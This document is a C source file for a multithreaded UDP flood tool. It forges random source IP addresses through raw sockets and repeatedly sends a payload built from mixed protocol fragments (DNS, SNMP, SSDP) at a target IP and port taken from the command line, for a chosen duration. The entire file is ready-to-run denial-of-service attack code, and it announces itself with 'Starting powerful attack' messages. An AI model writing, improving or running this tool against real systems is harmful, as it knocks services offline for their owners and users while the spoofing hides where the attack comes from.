#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <signal.h>
#include <netinet/ip.h>  // Header for IP spoofing
#include <netinet/udp.h> // Header for UDP spoofing

#define LARGE_BUFFER_SIZE 65507 // Maximum UDP packet size
#define MAX_PAYLOAD_SIZE 4096   // Increased payload size
#define MAX_SOCKETS_PER_THREAD 10 // Number of sockets per thread

char *ip;
int port;
int duration;
volatile sig_atomic_t stop_flag = 0;

// Raw payload (increased randomness)
char raw_payload[] =
    "\xd9\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x00\x00\xd9\x00\x00"
    "\x72\xfe\x1d\x13\x00\x00\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a"
    "\x69\x02\x03\x00\x00\x02\x00\x00\x0d\x0a\x0d\x0a\x00\x00\x05\xca"
    "\x7f\x16\x9c\x11\xf9\x89\x00\x00\x72\xfe\x1d\x13\x00\x00\x38\x64"
    "\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00\x77\x77\x77\x06\x67\x6f\x6f"
    "\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x30\x3a\x02\x01\x03\x30\x0f"
    "\x02\x02\x4a\x69\x02\x03\x00\x00\x01\x00\x00\x53\x4e\x51\x55\x45"
    "\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41"
    "\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00\x4d\x2d\x53\x45\x41"
    "\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a"
    "\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35"
    "\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a";

// Function to generate a spoofed IP address
char *generate_spoofed_ip() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d",
             rand() % 255, rand() % 255, rand() % 255, rand() % 255);
    return ip;
}

// Signal handler to stop the attack
void signal_handler(int signum) {
    stop_flag = 1;
}

// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Function to create a UDP packet with IP spoofing
void create_udp_packet(char *buffer, int payload_size) {
    struct iphdr *iph = (struct iphdr *)buffer;
    struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct iphdr));

    // Fill in IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr(generate_spoofed_ip());
    iph->daddr = inet_addr(ip);
    iph->check = checksum((unsigned short *)buffer, iph->tot_len);

    // Fill in UDP header
    udph->source = htons(rand() % 65535);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    udph->check = 0;

    // Copy the raw payload
    memcpy(buffer + sizeof(struct iphdr) + sizeof(struct udphdr), raw_payload, payload_size);
}

// UDP attack function
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[LARGE_BUFFER_SIZE];
    int sent_bytes;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket option to include IP headers
    int opt = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        perror("Failed to set socket option");
        close(sock);
        pthread_exit(NULL);
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Attack loop
    while (time(NULL) < end_time && !stop_flag) {
        // Create UDP packet with spoofed IP
        create_udp_packet(buffer, sizeof(raw_payload));

        // Send packet
        sent_bytes = sendto(sock, buffer, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(raw_payload), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            break;
        }
    }

    // Close socket
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Set up signal handler
    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        perror("Signal setup failed");
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    printf("Starting powerful attack on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    // Seed the random number generator
    srand(time(NULL));

    // Create and run threads
    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            stop_flag = 1;
            break;
        }
    }

    // Join threads
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
